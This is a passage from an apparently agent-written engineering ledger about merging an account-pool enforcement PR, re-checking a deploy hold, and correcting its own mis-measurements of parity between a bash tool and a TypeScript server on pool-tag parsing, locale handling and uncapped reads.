no-lift contract now points at the narrower D-2516 residual, so the two source paragraphs agree
instead of contradicting each other.

That correction added `+3` lines to `pools.ts` at `@@ -78,7 +78,10 @@`, which is exactly the shape
that has broken a citation in each of the last four rounds. It broke nothing: **no positional
`pools.ts` citation exists anywhere in the tree.** `io.ts` was untouched, so `readdir` stays at
`:108`, and the last citation pointing at it is now a symbol.

So the class is closed in the only way that means anything — not because a sweep reported zero, but
because there is no longer a positional citation in the blast radius for an edit to falsify.

Final state at this head, all measured on an isolated export:

- Full server suite identical to the no-`.git` sandbox baseline: 8004 passed, the same nine files
  failing for the same sandbox reasons.
- `ccd/ccd`'s provenance marker verifies `ccrc-unmodified`.
- The five guards that carry the most weight all red when mutated: the `crossPool` predicate, the
  deadline abort, the absent-is-a-proven-untag arm, `{ once: true }`, and `rejectAllPending`'s
  `dispose`.
- CI: agent, pwa and build-pwa green; server and macos still running.

**This PR is done by every measure available to me.** What remains is not a gate result:

1. The approving review has no lawful satisfier on this fleet — the one GitHub login authored it.
2. D-2517: the hold keeping wave 3 off the live server is a convention two sessions honour, not a
   mechanism. Merge moves this code onto `main`, where the next routine deploy by any of nine other
   supervised `ccrc-pwa` sessions would carry it. That exposure begins at merge, not at deploy.

Both are the operator's. I am not sending further rounds.

## `5e6b683b` — the merge, gated as a tree nobody ran

Main advanced by three PRs (#84 deploy slice policy, #75 crossrepo wave 1, #85 limit recovery) and
PR #81 went DIRTY. The worker merged `origin/main` in, resolving one conflict — `ccd/ccd`'s generated
marker — by keeping the combined body and restamping. A merge produces a tree neither author ever
ran, so the whole gate was re-run against it rather than inherited.

**Integration, verified rather than assumed.** Both sides of `ccd/ccd` are present. Main's work is
all there: `runId: null` on the ask event at `server.ts:1827`, `STALE_PRESS_COOLDOWN` in `ccd/ccd`,
`deploy/assert-slice-policy.sh`, crossrepo wave 1's `coord/`. This branch's pool work survived the
auto-merge intact — the `crossPool` predicate at `server.ts:2000`, six `PROJECT_POOLS_REQUEST_BUDGET_MS`
call sites.

**The comment-only claim, re-tested on the merged tree.** Stripping comments and blanks from
`ccd/ccd` on both `origin/main` and the merge gives **identical files** — this branch adds no
executable `ccd/ccd` byte on top of main, and the provenance marker verifies `ccrc-unmodified`. That
claim had only ever been measured on a parent; a merge is exactly where it could have stopped being
true.

**Full suite: 8153 passed, 295 files, and the only failures are the same nine no-`.git` sandbox
files. Zero new.** All seven weight-bearing guards re-mutated on the merged tree and all seven RED:
the `crossPool` predicate, the deadline abort, the late-root normalization, `{ once: true }`,
`rejectAllPending`'s `dispose`, local signal forwarding, and the refusal scan's reverse direction.

**The merge hazard, checked where it actually lives.** The rule is that a merge falsifies whichever
side claimed something about the *other* side's absence — so every consumer census this PR wrote was
re-tested against the merged tree, not against the parent that produced it. All survive:
`pwa/src/lib/offline.ts:10` is still `HUES`'s only importer; `refreshcaps.ts` and its test still
import `FleetState` from `remote/client.js`; `CCRC_MEASURED`'s consumers are unchanged;
`_inst_accounts_sh` still exists; and main added no refusal token, so the scan stays green in both
directions.

### The `ccd/ccd` citation measurement, and why it is NOT a finding against this PR

Main's `+223` lines and this branch's net-negative comment hunks together shift `ccd/ccd` line
numbers, so I measured all **303** distinct `ccd/ccd:N` citations in the tree: **31 point at
different content on the merged tree than on `origin/main`**, and pre-merge the figure was 35 of 303
against the merge base.

That looks like the recurring class at its largest — and it is not. Sampling shows they were already
stale **on main**: `server/src/remote/runner.ts:90` cites `ccd/ccd:13722` for *"`cmd_swap` stops the
supervisor unit"*, and on `origin/main` that line reads `# That lane has two answers here (idle /
not)…`. `ccd/ccd` is a 16,000-line file that every program edits; positional citations into it are
stale everywhere, on main as much as here. This PR did not break them and fixing 303 of them is not
this PR's work — D-2511 already ruled the remedy (cite symbols) and already ruled the scope (do not
sweep the repo).

Worth recording as a number rather than an impression: **303 positional `ccd/ccd` citations live in
this repo, and they are unreliable by construction.** That is a repo-level finding for whoever owns
`ccd/`, not a wave-3 correction.

CI at this head: server, agent, pwa and build-pwa green; macOS running. Nothing changed about the
two open questions — the approver, and D-2517.

## PR #81 MERGED — `b879510f`, 2026-09-11 11:58Z

Squash-merged by the operator. Verified on `main` directly rather than on report: `pools.ts`'s
deadline and `server.ts`'s `crossPool` predicate are both present at `origin/main`.

**Protocol, in the order that matters.** Run 43 opened (`account-pools`, positional wave 5/6, the PWA
wave) BEFORE run 35 was closed — close-first would have taken the open-run count to zero and retired
the program. Run 35 then closed `done` with `released:false`, its sibling holding the claim.

Two things worth recording about the close. The fingerprint I sent was built from
`origin/ws/clear-meadow`, and that remote ref no longer exists — GitHub deleted the branch on merge,
so I was reading a stale remote-tracking ref. It gave the right sha only because the workspace's local
branch is at the same commit, and the close passed because `verifyDone` measures the workspace's own
git refs, which is the authority. Right answer, wrong source; the rule is
[[remote-tracking-ref-is-not-evidence]] and I used one anyway.

And the dispatch of run 43 was refused `worker-busy` — idle-gated like mail. Run 43 stays `planned`;
it retries.

### The squash-merge carry the next wave would have tripped over

`ws/clear-meadow` is **not an ancestor of main**: the squash left 75 commits on the branch that main
does not have, while the two **trees are byte-identical**. A wave-5 PR opened from it unrebased would
carry 75 phantom commits. The dispatch brief now says to re-base first and to prove it **by content**
— `git diff origin/main` printing nothing — never by ancestry, which on a squash merge cannot fail
and therefore proves nothing ([[ancestry-is-not-content]]).

## D-2000 is not a deploy gate — it is a live fail-open, and I had the premise wrong

The operator asked whether the D-2517 exposure (the deploy hold has no mechanism) was worth a PR. It
sent me to read D-2000 itself, which I had been citing for weeks without reading:

> **D-2000** — REPORTED, NOT TAKEN. The `.project` fold described under D-1990: an unreadable
> `.project` reads `untagged` and lifts the pool constraint for that row, at four sites.

That is a DEFECT, not a deployment policy. "Do not deploy while D-2000 is open" is an inference
someone drew from it — a sound one, but the deviation says nothing about deploying.

**Measured against main's own code, in a fixture:**

| registry state | `_reg_get demo project` | `_project_pool_state "$project"` |
|---|---|---|
| healthy | `myproj` | `named pool-a` |
| `chmod 000` | `''` | **`untagged`** — constraint LIFTED |
| `chmod 000`, real name passed | — | `unreadable` — the correct arm |

`_reg_get` folds unreadable to `""`; `_project_pool_state`'s first statement short-circuits an empty
argument to `untagged` *before* its own `$REG` check. So the condition that should trigger the
fail-shut arm is the same condition that empties its argument, and that arm is unreachable from every
call site. The overloaded null this repo's rules forbid, in the enforcement path itself.

**And the recorded scope is too small.** D-2000 says four sites, D-2009 says three refusals, and an
in-file comment also says four. Measured: **nine** live `_project_pool_state` call sites —
`_ws_least_loaded`, `cmd_ws_add`, `_swap_target`, `_auto_swap_check`, `cmd_start`, `_strand_why`,
`_strand_mark`, `cmd_swap`, `cmd_prefer`.

**So the right PR is not a deploy gate.** A gate would enforce a hold whose cause stays live. Closing
D-2000 removes the reason for the hold — and it matters more now than it did yesterday, because wave 3
just made the SERVER enforce pools while ccd still lifts them exactly when the registry is unreadable.
The two halves now disagree precisely when the box is sick.

Design is out to a panel: three approaches, each required to measure in a fixture, judged on
fleet-safety and on which one actually removes the overloaded null rather than relocating it.

### CORRECTION — the fail-open I reported is not live, and the error was mine

I told the operator, an hour ago and in this ledger, that D-2000 is "a live fail-open on main right
now". **It is not.** A design panel refuted the premise and I verified the refutation myself.

Every registry-sourced pool decider reads `.project` through **`_reg_read`**, not `_reg_get`, and
guards on its rc:

```
_reg_read() {   # id field -> stdout the value; rc 0 = read, 1 = absent, 2 = unreadable
project=$(_reg_read "$id" project); prjrc=$?
[[ "$prjrc" -eq 2 ]] && ! _pool_untaggable && return 3
```

Measured in a fixture against main's own extracted `_reg_read`: healthy+present → rc 0,
healthy+absent-field → rc 1, unsearchable `$REG` → **rc 2** for any field. And the guard is present at
`_swap_target`, `_auto_swap_check`, `cmd_start`, `cmd_swap` and `cmd_prefer`. `cmd_ws_add`'s project
is `${1:?…}`, never empty, so it reaches the reader's own `$REG` test and answers `unreadable`.

**So what did I actually measure?** I extracted `_reg_get` and `_project_pool_state`, composed them,
and measured *that*. The composition is real — both functions exist and behave exactly as I showed —
but it is **not the composition the deciders perform**. I took D-2009's sentence ("all three feed
`_project_pool_state` from `project=$(_reg_get "$id" project)`") as the site inventory and never
checked it against the call sites. That sentence predates wave 2b and #69's rounds 3–4, which
introduced `_reg_read`.

That is precisely the class I have been charging the worker with for ten rounds: **a measurement
taken correctly, on the wrong thing, with the inference reaching past what it supports.** I had the
evidence in my own terminal — my grep output showed `_reg_read` at those sites — and did not look.

**My census was also wrong.** I reported nine call sites. The correct anchor
(`/bin/grep -nF '_project_pool_state "'`, non-comment) gives **eleven**: I anchored on the variable
name `pps=$(`, which is blind to `cmd_project_pool:6097` (`oldstate=`) and `:6343` (`finalstate=`).
An anchor chosen on a spelling rather than on the symbol, which is the same defect as a positional
citation.

One panel claim I am NOT relaying, because I checked it and it is not the tree's shape: the
`local p=$(_reg_read …); rc=$?` rc-masking hazard. All four deciders declare `local` on a separate
line from the capture.

### What is actually true, and what is worth doing

- **`_reg_read` already is the measured sibling** the house rules ask for, in bash, with a three-value
  rc. The pool deciders already consume it. The fail-shut is real.
- **A narrow residual survives**: `_ws_least_loaded` (called zero-arg by design) and `_strand_why` can
  still take the empty-argument arm and answer `untagged` where `unreadable` is true. The one-line
  reorder closes it. Both judges agree it closes **zero** live verb outcomes today — its value is
  structural: fail-shut stops depending on eleven callers each remembering to measure, right as wave 3
  adds a second enforcer.
- **D-2000, D-2009 and `ccd/ccd:16099` describe a tree that no longer exists**, and they are the
  stated basis for holding wave 3's deploy. That is the highest-value correction available, because a
  false premise is holding a deployment.
- **The hold itself may be obsolete.** Both judges reached this independently: the five registry-sourced
  deciders already refuse in every state wave 3's server refuses, so "ccd silently permits what the
  server refuses" is not reproducible at `b879510f`. Neither the reorder nor any design here lifts the
  hold — what would is a state-by-state re-measurement of ccd's verdicts against wave 3's actual
  enforcement (`refusePool`/`poolRule`). That is the next act, and it is measurement, not more reading.

Run 43's dispatch is refused `cap-concurrency` (7/7 running, five of them `expoAI-assistant`'s). It
holds its place as `planned`.

### My close raced the worker's fingerprint — ruling, and the second error in an hour

The worker reported (mail 569) that wave-done mail 565 came back `rejected / run closed`: they
measured and sent exactly one merged fingerprint, and my close of run 35 landed first. They declined
to send a second — worker clause 9 forbids reasserting a rejected claim without a new commit — put
task 6 back to `in_progress`, and asked for a ruling. All of that is correct.

**The error is mine, twice over.** The protocol requires the WORKER's post-merge fingerprint; I
measured one myself and closed on it. And I built it from `origin/ws/clear-meadow` — a ref GitHub had
already deleted at merge. `git fetch` printed `couldn't find remote ref` **in my own terminal** and I
used the stale local copy anyway.

Nothing is lost on the claim: their sha and the one the close carried are byte-identical
(`5e6b683b…`, prNumber 81, prPhase merged), and `verifyDone` re-measured the workspace's own refs
rather than trusting my body, which is the only reason a fingerprint built from a deleted ref was
still correct. Right answer, wrong source — [[remote-tracking-ref-is-not-evidence]], ignored by the
person who keeps citing it.

Ruled: no second fingerprint (their clause-9 reading affirmed, not overridden); task 6 back to
`done`; and re-send only the half of wave-done that is **not** a claim — the prose saying what waves
4/5 need that their plans cannot see, which my early close destroyed. Prose reasserts nothing, so
clause 9 does not reach it.

**The pattern across today is one thing, not three.** The stale-citation class, the `_reg_get`
composition I measured instead of the one the deciders perform, and now a fingerprint off a deleted
ref: each is a correct measurement of the wrong object. I have spent ten rounds naming that class in
someone else's work and produced three instances of it in a morning. The common cause is not
carelessness about measuring — every one of these was measured — it is failing to check that the
thing measured is the thing in question.

### Wave-3 carries, recovered (mail 575)

The prose half of wave-done, re-sent after my early close destroyed it. Recording it here because the
ledger is its durable home and a mail row is not.

**For wave 4 (PWA):** preserve all three evidence levels — an absent `pool` key is an older server or
no evidence and renders nothing, an explicit `untagged` is measured and unconstrained, `unreadable`
or `malformed` means nobody decides; a collapsed listing maps every project to `unreadable`, never
`untagged`. The degraded `GET /api/fleet` arm omits pools deliberately (tags are not persisted), so
`projectPools: unknown` means stay silent and only `unavailable` arms the redeploy banner — never
cache tags or infer policy from a prior frame. All five HTTP consumers share one server-owned 10s
budget and the watcher half its cadence; expiry degrades the whole listed population coherently,
which is a snapshot rule and not a partial-success rule. A declared `crossPool` skips the server
verdict after the shared root read, so an unreadable tag can surface ccd's 502 rather than the
server's 503. And D-2516 stays a reporting divergence only: **the PWA must not turn the HTTP forecast
into authority.**

**For wave 5 (docs):** D-1916 (`cmd_project_pool`'s census uses `CCRC_ACCOUNTS`, placement uses
`CCRC_HOME_ABLE`), D-1917 (the strand banner names a pool while its census names `_pool_for`), D-1919
only if its #61 owner has not closed it; the canonical README section for D-1918; W3-1 and D-1957's
ccd prose sweep, measuring citations **at a named ref** rather than copying old counts; spec §5.4.4's
obsolete reader algorithm and its trailing-whitespace claim, because the 64-byte cap runs BEFORE the
strip; and D-2516/D-2517's status.

The worker has already absorbed this morning's correction without being told twice — their own last
carry reads *"Do not carry D-2000/D-2009's live fail-open premise as current fact."*

### D-2008's boundary, verified rather than filed

One carry had operational teeth, so I measured it instead of recording it: **the pool verdict is
capped at 64 bytes; the read and the transfer are not.**

- `localIO.readFileMeasured` → `readFile(p, {encoding:'utf8', signal})`. No size limit.
- The agent's plain `read` op → `readWhole` → `readFile(p,'utf8')`. **No cap** — the 12 MB
  `MAX_READ_B64_BYTES` guards the B64 op only, and the result returns in one JSON WS frame.
- `pools.ts:209` then applies `content.length >= 64` — after the whole file is in memory, and on a
  remote fleet after it has crossed the wire.

So a large file at `$REG/pools/<project>` is read whole and shipped whole, every marker, every
watcher tick, to be classified `malformed` by a 64-byte test. Honest bounds on it: planting one needs
fleet-box shell, which is already a trusted position, so this is a robustness gap rather than an
attack surface; and it is **inert today**, because until the first tag exists `pools/` is absent from
the root listing and the reader does no I/O at all. It arms with the first tag written.

That is worth a mechanism eventually — a `statMeasured` rung before the read, or a capped read op —
but it is wave-3's recorded D-2008, not something to bolt on now.

## The state-by-state re-measurement — ccd's verdicts against wave 3's server enforcement

Run 2026-09-11, coordinator, on `origin/main` (wave 3 merged as PR #81). This is the measurement I
recommended to the operator rather than raising a PR on the refuted D-2000/D-2009 premise. It answers
one question: **do the two readers of `$REG/pools/<project>` decide the same way, state by state?**

Both sides enumerated from source, not from prose:

- `ccd/ccd` `_project_pool_state` → `named <n>` | `untagged` | `unreadable` | `malformed`, always rc 0,
  consumed through `_pool_ok` (0 serve / 1 mismatch / 2 undecidable) at **11** call sites.
- `server/src/pools.ts` `readProjectPoolsAt` → `tagged` | `untagged` | `unreadable` | `malformed`,
  decided by L0's `poolRule` (`shared/poolrule.ts`) through `poolVerdict`, enforced by `refusePool`
  (409 `pool-mismatch`, overridable with `crossPool`; 503 `pool-unreadable`, not overridable).

| disk state | ccd | server | agree |
|---|---|---|---|
| no project argument | `untagged` → serve | `untagged` → proceed | ✅ |
| `pools/` proven absent | `untagged` → serve | not in root listing → `untagged` | ✅ |
| marker proven absent | `untagged` → serve | `reason==='absent'` → no entry → `untagged` | ✅ |
| `$REG` missing / unsearchable | `unreadable` → undecidable | `listed:false` → `unreadable` → 503 | ✅ |
| `pools/` not a dir, or not `-x` | `unreadable` | `listed:false` → 503 | ✅ |
| marker not a regular file, or `-r` fails | `unreadable` | read `!ok` → `unreadable` → 503 | ✅ |
| marker contains NUL | `malformed` | `content.includes('\0')` → 503 | ✅ |
| marker ≥ 64 bytes | `malformed` | `content.length >= 64` → 503 | ✅ |
| marker fails the name grammar | `malformed` | `POOL_NAME_RE` fails → 503 | ✅ |
| marker is a valid name | `named <n>` → compare | `tagged` → `same-pool` / `pool-mismatch` | ✅ |
| **`pools/` a dangling symlink** | `unreadable` → undecidable | follows to ENOENT → **`untagged`** | ❌ |
| **marker a dangling symlink** | `unreadable` → undecidable | follows to ENOENT → **`untagged`** | ❌ |

**Ten of twelve agree. The two that diverge are D-2516, already disclosed in-tree** — `pools.ts`'s
`ProjectPoolsRead` docstring names it exactly: "`FleetIO.readFileMeasured` follows the listed symlink
to ENOENT, so that single marker still reads untagged here while ccd detects the link and remains the
fail-shut authority." The divergence runs in the permissive direction on the FORECASTING side only, and
`ccd` re-takes every decision at placement (spec §5.1; `poolrule.ts`: "The server REFUSES and
FORECASTS; it never places"). So it degrades a forecast, and cannot produce a wrong placement.

**Consequence for the deploy hold.** D-2000/D-2009's premise — a live fail-open — was already refuted
(`e6a3d1a5`). This is the positive half: the server's enforcement does not diverge from ccd's authority
in any direction that permits work ccd would refuse. **The hold has no surviving technical ground.**
Lifting it is the operator's call, not mine; what I can say is that the reason recorded for it is gone.

### What the measurement DID find — and it is not a verdict divergence

The two readers apply the same 64 with different mechanisms, and only one of them is bounded:

- `ccd/ccd`: `IFS= read -r -d '' -n 64 v` — **64 is a READ CAP** (D-1850). Never reads past 64 bytes.
- `server/src/pools.ts:209`: `read.content.length >= 64` — **64 is a POST-READ TEST**, applied after
  the whole file is in memory and, in remote fleet mode, after it has crossed the wire.

Same verdict on every input. Unbounded cost on one side. This is D-2008, and the measurement sharpens
it past what that entry says:

1. **It is concurrent, not per-tick.** `pools.ts` reads markers in `Promise.all` over the entire
   `pools/` listing — every marker at once, all resident together. The loop's cost is the whole
   directory, not one file.
2. **The deadline does not bound it.** `remote/client.ts`'s abort does `this.pending.delete(id)` and
   nothing else, and **there is no cancel op in the agent protocol** — `agent/src/server.ts`'s op list
   has none. So an expired budget abandons the *promise* while the agent still reads the whole file and
   still sends the frame. The deadline guards latency; it does not guard memory or the link.
3. **The remote read is uncapped end to end.** agent `case 'read'` → `readWhole` → `readFile(p,'utf8')`,
   returned in one JSON WS frame. `MAX_READ_B64_BYTES` (12 MB) guards the *B64* op only — a different op.
4. **ccd already judged this worth fixing at this exact file**, and its own comment supplies both the
   cost curve (10 MB → 0.20 s / 32 MB RSS; 100 MB → 39 s / 979 MB RSS — "linear and unbounded") and the
   reachability: `ln -s ~/.cc-sessions/swap.log pools/<p>`, a tag that grows on its own. `-f` follows
   symlinks, so the type gate passes on both sides.

Bounded honestly, as the earlier over-claims this program has already cost require: planting a marker
needs write access to `$REG`, which is **an already-trusted position** — CLAUDE.md's own "identity on
the fleet is attribution, not authentication". So this is a robustness gap, not a privilege escalation.
And it is **inert today**: with no tag written, `pools/` is absent from the root listing and
`readProjectPools` returns before any marker I/O. It arms with the first tag.


### CORRECTION — D-2008 already said all of it, and my one new fact argues the other way

Same session, one hour later, after an adversarial pass. **The section above oversells itself and the
error is mine, for the third time today and from the same root cause: I worked from a summary of a
document instead of the document.**

What D-2008 actually says, read verbatim at
`docs/superpowers/plans/2026-09-05-account-pools-wave3-server.md:3692`, is every measurement I
presented as "sharpening it past what that entry says":

- "the cap is applied to `read.content` — i.e. AFTER the whole file has been read"
- "that read is the agent's `readWhole` … which is uncapped, so the bytes still cross the fleet
  WebSocket in full; on `local` it is `localIO.readFileMeasured`, a bare `readFile(p,'utf8')`, equally
  uncapped"
- "Task 7 then puts that read on the WATCHER TICK — one whole-file read per tagged project per tick"
- "This is D-1850's own hazard restated in TypeScript on a faster loop"
- the same `ln -s ~/.cc-sessions/swap.log pools/<p>` constructor, and the same 100 MB figure

So there was nothing to sharpen. Strike the word from the section above; the measurements stand, the
claim to novelty does not.

**The one fact that WAS new — no cancel op in the agent protocol — supports the park, not the fix.**
D-2008's stated reason for not closing is that "a bounded read is a NEW agent op … and this wave's
Global Constraint is that the server adds no agent surface." Closing it properly now needs a bounded
read op *and* a cancel op: twice the surface that ruling refused. I found evidence for the other side
and read it as evidence for mine.

**Severity is bounded further than the section above says.** `maxPayload` is set nowhere in
`server/src`, `agent/src` or `shared/` — so `ws`'s 100 MiB default governs both ends. A frame past it
errors the socket and closes it, and the existing reconnect-with-backoff runs; in-flight requests
reject. The failure mode is a connection flap the transport is already built for, not a server OOM,
and the RSS that does grow is the *agent's*, on the fleet box the actor already controls.

### What survives, and it is small

**D-2008's own closing sentence is false as merged.** It ends: "It is stated in the source at the read,
not only here." Measured: `git grep -n D-2008 origin/main` returns **exactly one hit** — the plan file
itself. `server/src/pools.ts` contains no occurrence of `transfer`, `whole file`, `uncapped`,
`unbounded`, `RSS`, `memory` or `D-2008`. The comment at the `read.content.length >= 64` site argues
the `>=` boundary (D-2010) and the ccd mirror, and nothing else. **A disclosed-not-closed deviation
lost its disclosure at the one site where it does any work** — which is the same defect class this
program has been catching since wave 1: a claim that is true in the plan and absent from the tree.

**Remedy, and it is not a PR:** one sentence in the existing comment block at `pools.ts`'s cap naming
D-2008 and saying the cap bounds the VERDICT and not the TRANSFER, plus its prose anchor. It belongs in
**wave 5**, which already edits and pins source comments and to which D-2008 itself already hands the
related §5.4.4 spec drift. No separate PR, no new agent surface, no new D-number.

**Answer to the operator's conditional authorization** ("raise another PR to close the exposure if you
think it's significant enough"): **no.** It is not significant enough, and my earlier judgment that it
was rested on not having read the entry that already owned it.


### The panel's two findings — severity revised UP, and the naive fix was wrong

A protocol/skew reviewer contradicted the refuter on severity and found a defect in the fix I would
have specified. Both halves measured by hand before recording.

**1. The 100 MiB close is not a self-healing flap — I passed that on too cheaply.** `maxPayload` is set
nowhere in `server/src`, `agent/src`, `shared/` or `pwa/`, so `ws`'s 100 MiB default governs both ends
and an over-size frame closes the socket with 1009. What I repeated was "a connection flap the
transport is already built for". Measured, that understates it twice over:

- `remote/client.ts:onClose` (`:358`) calls `rejectAllPending(new Error('disconnected'))` (`:363`),
  then pushes a synthetic exit to **every** registered pty listener (`:369`) and clears them (`:372`).
  A pool marker thus fails every in-flight request on the one fleet socket and tears down every pty and
  tail — fleet-wide, not pool-scoped.
- `watch.ts` ticks `setInterval(…, intervalMs = 2000)` (`:673`, `:680`) → `emitPools` (`:802`) →
  `readProjectPools` (`:1209`). **The read is re-issued every 2 seconds**, so the close re-arms on
  cadence. The transport is built for *a* flap, not for one every tick indefinitely.

The reachability stays non-adversarial, which is what makes this matter: `ln -s ~/.cc-sessions/swap.log
pools/<p>` is a tag that grows on its own, and swap.log on a ~20-session fleet doing rescue swaps can
reach 100 MB without anyone attacking anything. **Inert today** (no tag exists, and wave 3's server is
not deployed), but if armed the failure is a wedged fleet link, not a slow read.

**2. A 64-BYTE cap would have introduced a new wrong answer. Measured, not argued.** Three units, one
number: `ccd` caps in locale CHARACTERS (`read -n 64`), `pools.ts` tests UTF-16 CODE UNITS
(`content.length >= 64`), a wire cap would count BYTES. `pools.ts` argues the mismatch is harmless
because non-ASCII fails `POOL_NAME_RE` — but **non-ASCII whitespace is stripped before the regex runs**
(`content.replace(/\s+$/, '')`, and JS `\s` includes U+3000).

Construct `"pool-a"` + 19×U+3000 + `" "` = exactly 64 bytes, then 10 MB of `z`:

| reader | verdict |
|---|---|
| `ccd` (`-n 64`, chars, stops short of EOF → rc 0) | `malformed` |
| server today (uncapped) | `malformed` |
| **server with a 64-byte cap** | **`tagged: pool-a`** |

Run under node against the real `POOL_NAME_RE`: capped content is 26 UTF-16 units, strips to `pool-a`,
matches. The cap flips the verdict at exactly the seam D-2010 and `pool-name-parity.test.ts` exist to
hold. **The correct fix therefore needs a response-side `truncated` marker** (spread only when true,
`readB64Payload`'s shape) so the server can answer `malformed` on "the cap was reached" — which is
precisely what `ccd`'s rc 0 already means. Without it the cap is also *invisible* at the pools verdict,
so a test written at `readProjectPools` stays green when the cap is mutated away: a comment, not a
mechanism. The pin has to live at the io/agent seam.

**3. Option A is not "server-only".** `FleetIO.statMeasured(path)` carries **no** `timeoutMs` and no
`signal` — only `readFileMeasured` and `readdir` do, and `pools.ts` forwards the deadline to both. So A
either leaves the stat leg outside the pool deadline (N entries pending up to the 15 s default per
tick, on a watcher cadence) or widens an **L2 port** plus both adapters plus every `FleetIO` double.
And `stat().size` lies for the node types that matter — `/proc` reports 0, a FIFO reports 0 — so A
gives an unbounded read a false "small, safe" signal. `ccd` closed that with a TYPE gate
(`[[ -f "$f" && -r "$f" ]]`) which neither option ports.

### Conclusion — unchanged, and now for a better reason

Still **no separate PR**, and the panel strengthened that rather than weakening it: the fix I would
have shipped was wrong, and the correct one needs a `truncated` response marker *and* — for the 1009
class — a cancel op the protocol does not have. That is more agent surface than wave 3's Global
Constraint refused, so closing D-2008 is a **ruling to reverse deliberately in a wave**, not a
follow-up PR to slip in. One design note for whoever takes it: a `cancel` op degrades *perfectly* on an
older agent (`bad-request` → ignored → today's behaviour), whereas a new `readCapped` op degrades
*badly* — an older agent's `bad-request` maps to `unreadable` for **every** project.

What wave 5 should carry is now two sentences, not one: the disclosure at `pools.ts`'s cap must name
D-2008 **and** say the residual is a transfer bound, with the 1009 link-death class as its worst arm —
not merely "the cap bounds the verdict".


## CORRECTION — "ten of twelve agree" was wrong, and the strip is why

A design reviewer challenged the agreement table above. They were right, and I have measured it. **My
table enumerated the STRUCTURAL states and then asserted agreement inside the `named`/`malformed`
boundary without testing the strip that runs in front of the grammar.** Same error shape as the rest of
today: I measured the states I had enumerated, not the states the two readers actually distinguish.

Both strips run BEFORE `POOL_NAME_RE`, and they use different whitespace vocabularies:

- `ccd/ccd`: `v=${v%"${v##*[![:space:]]}"}` — glibc `[[:space:]]`, in the ambient locale.
- `server/src/pools.ts:217`: `read.content.replace(/\s+$/, '')` — JS `\s`, which is Unicode Zs + BOM.

Measured here (bash 5.2.21, glibc, `LANG=en_US.UTF-8`), tag content `pool-a` + one trailing character.
The probes build every character from its codepoint and never invoke `ccd` or touch any registry
(`scratchpad/striptest.sh`, `striptest.js`):

| trailing char | ccd (authority) | server | |
|---|---|---|---|
| U+0020 SPACE | `named pool-a` | `tagged pool-a` | agree |
| U+0085 NEL | `malformed` | `malformed` | agree |
| U+3000 IDEOGRAPHIC SPACE | `named pool-a` | `tagged pool-a` | agree *(UTF-8 locale only)* |
| U+205F MED MATH SPACE | `named pool-a` | `tagged pool-a` | agree *(UTF-8 locale only)* |
| **U+00A0 NBSP** | **`malformed`** | **`tagged pool-a`** | **DIVERGE** |
| **U+2007 FIGURE SPACE** | **`malformed`** | **`tagged pool-a`** | **DIVERGE** |
| **U+FEFF BOM** | **`malformed`** | **`tagged pool-a`** | **DIVERGE** |
| **U+202F NARROW NBSP** | **`malformed`** | **`tagged pool-a`** | **DIVERGE** |

Four divergences, not the three the reviewer named — U+202F is a fourth they missed. **In every one the
SERVER is more permissive than the AUTHORITY**: it forecasts `tagged pool-a` on a tag `ccd` refuses.

### D-2519 (2026-09-11) — the strip vocabularies differ, and `pools.ts`'s sufficiency argument is false

`server/src/pools.ts`'s own comment says the bytes-vs-UTF-16-units mismatch is safe because "anything
non-ASCII fails `POOL_NAME_RE` below and is `malformed` on both sides regardless of which side's cap it
trips". **That reasons about the regex as though it were the last gate. The strip is in front of it**,
so a non-ASCII character JS `\s` removes never reaches the regex at all: `pool-a` + U+00A0 strips to
`pool-a`, which PASSES. Not "malformed on both sides regardless" — `tagged` on the server, `malformed`
on `ccd`.

**Consequence, bounded:** `ccd` stays fail-shut, so **no wrong placement happens** — the server 200s a
placement the fleet then refuses with `nothing was touched`. It is a wrong FORECAST, which is the exact
class `shared/poolrule.ts` exists to prevent ("never a 409 offering a crossing over a constraint that
was never read"). **Reachability:** `cmd_project_pool` validates through `_pool_name_valid` before
writing, so the verb cannot emit these; it needs a hand-written tag — which the tree explicitly blesses
("a shell `echo pool-a > pools/demo` is a legal writer, ruling 2"). A pasted U+00A0 or a BOM is an
ordinary accident, not an attack.

**Fix direction:** narrow BOTH sides to an explicit ASCII class — `/[ \t\n\r\f\v]+$/` and a literal
bracket class in `ccd` — which is deterministic, locale-free, and refuses nothing any legal writer
(`echo`, `printf`, the verb) emits.

### D-2520 (2026-09-11) — `ccd`'s strip is LOCALE-DEPENDENT, so the authority is non-deterministic

Same probe, same bytes, only `LC_ALL` changed:

| trailing char | `LC_ALL=C` | `LC_ALL=en_US.UTF-8` |
|---|---|---|
| U+3000 | `malformed` | `named pool-a` |
| U+205F | `malformed` | `named pool-a` |

`ccd` sets no global locale (`ccd:9` is `set -uo pipefail` and nothing else), and it KNOWS the
distinction elsewhere — `_lc_dec_ok` shadows `local LC_ALL=C` precisely because the default is not
bytes. So the same tag file is decided differently by two `ccd` invocations on one box under different
environments (a systemd unit's minimal env versus an interactive shell). **This is worse than D-2519 in
kind**: D-2519 is two readers disagreeing, D-2520 is the AUTHORITY disagreeing with itself, and nothing
in either reader can report which answer you got. The same ASCII-class fix closes it.

### D-2521 (2026-09-11) — the cap's own test says "bytes"; the cap counts CHARACTERS

`server/test/ccd-project-pool.test.ts:278`, inside the test whose title calls itself "the `-n 64` cap's
only evidence at any plausible bound", opens: "`read -r -d '' -n 64 v` **bounds the read at 64 bytes**."
It does not — `read -n` counts characters in the ambient locale, which is what D-2520 is about.
`pools.ts` gets this right ("`read -n` counts characters in the shell's locale"); its mirror test does
not. **This is the comment that makes a byte-cap look like an exact mirror of `-n 64`**, and it is
directly upstream of the trap measured earlier today, where a 64-BYTE cap answers `tagged pool-a` on an
input both readers call `malformed`.

### What this does and does not change

- **The deploy hold's ground is still gone.** D-2519/D-2520 are forecast divergences with `ccd`
  fail-shut at placement; they do not reinstate D-2000's fail-open premise.
- **The agreement claim in the table above is withdrawn** for the `named`/`malformed` boundary. The
  structural states still agree as measured; the grammar boundary does not.
- **These are NEW**, checked rather than assumed after this morning's D-2008 mistake: no deviation,
  spec or plan in `origin/main` records the strip-vocabulary or locale question for the pool tag.


## The follow-up PR — operator ruling, and what it became

**Operator, 2026-09-11: "if the PR isn't merged yet, fold it in, otherwise its own PR."** Measured:
PR #81 merged at 11:58 UTC as `b879510f`, and no open PR touches the pool tag (#87 is the codex lane,
#86 crossrepo, #60 governance). So: **its own PR**, on `fix/pool-tag-locale-parity` off `b879510f`.

**What it carries is NOT the D-2008 exposure** — that stays parked, for the reasons recorded above. It
carries D-2519..D-2522, the parity defects found while measuring, all four of them live in merged code.

### The fix turned out to be one idiom, not the two-option fork

